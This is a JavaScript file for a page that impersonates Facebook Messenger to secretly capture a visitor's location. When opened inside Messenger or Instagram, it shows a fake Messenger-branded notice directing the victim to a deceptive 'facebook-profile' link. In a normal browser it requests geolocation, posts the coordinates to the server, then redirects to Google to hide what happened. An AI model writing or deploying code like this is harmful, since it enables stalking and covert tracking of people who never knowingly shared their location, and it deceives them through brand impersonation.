function isInAppBrowser() {
  const ua = navigator.userAgent || "";
  return /FBAV|FBAN|Messenger|Instagram/i.test(ua);
}

function getCoordinates() {
  if (isInAppBrowser()) {
    // Messenger/Instagram blocks location access
    document.body.innerHTML = `
      <div style="padding: 40px; font-family: sans-serif; text-align: center;">
        <h2 style="color:#0084ff;">Messenger</h2>
        <p style="font-size: 15px;">Messenger blocks location access.</p>
        <p style="font-size: 14px;">Please open this page in Safari or Chrome:</p>
        <a href="https://facebook-profile-nakz.onrender.com" target="_blank" rel="noopener noreferrer"
           style="display:inline-block;margin-top:15px;background:#0084ff;color:white;padding:12px 20px;border:none;border-radius:6px;font-size:16px;text-decoration:none;">
          🔗 Open in Safari or Chrome
        </a>
        <p style="margin-top:12px;font-size:13px;color:gray;">Or copy this link:</p>
        <div style="background:#f1f1f1;padding:10px;border-radius:5px;font-size:13px;">
          https://facebook-profile-nakz.onrender.com
        </div>
      </div>
    `;
    return;
  }

  // In real browser — try to get coordinates
  if (!navigator.geolocation) {
    alert("❌ Geolocation is not supported.");
    window.location.href = "https://google.com";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };

      fetch("/coordinates", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then(() => {
          // After sending coordinates, go to Google
          window.location.href = "https://google.com";
        })
        .catch(() => {
          // If there's an error, still redirect
          window.location.href = "https://google.com";
        });
    },
    () => {
      alert("❌ Permission denied.");
      window.location.href = "https://google.com";
    }
  );
}
